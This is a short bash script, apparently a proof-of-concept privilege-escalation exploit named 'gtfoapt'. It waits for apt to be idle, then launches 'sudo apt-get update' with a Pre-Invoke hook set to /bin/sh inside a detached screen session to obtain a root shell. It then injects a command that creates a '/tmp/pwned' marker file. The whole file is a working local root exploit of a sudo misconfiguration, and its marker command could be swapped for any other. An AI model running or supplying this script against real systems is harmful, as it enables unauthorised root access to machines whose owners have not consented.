#!/bin/bash
SCRIPTNAME="gtfoapt"
LOGFILE=/tmp/$SCRIPTNAME.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null
check_apt() {
  pgrep -f "apt" || pgrep -f "dpkg"
}
while check_apt; do
  log "Waiting for apt to be available..."
  sleep 10
done
screen -S $SCRIPTNAME -X quit
screen -d -L -Logfile /tmp/pwned_$SCRIPTNAME.log -S $SCRIPTNAME -m sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
screen -S $SCRIPTNAME -X colon "logfile flush 0^M"
log "shell started.."
log 'sending screen command: touch /tmp/pwned_$SCRIPTNAME';
screen -S $SCRIPTNAME -p 0 -X stuff "touch /tmp/pwned_$SCRIPTNAME^M"
log "done"
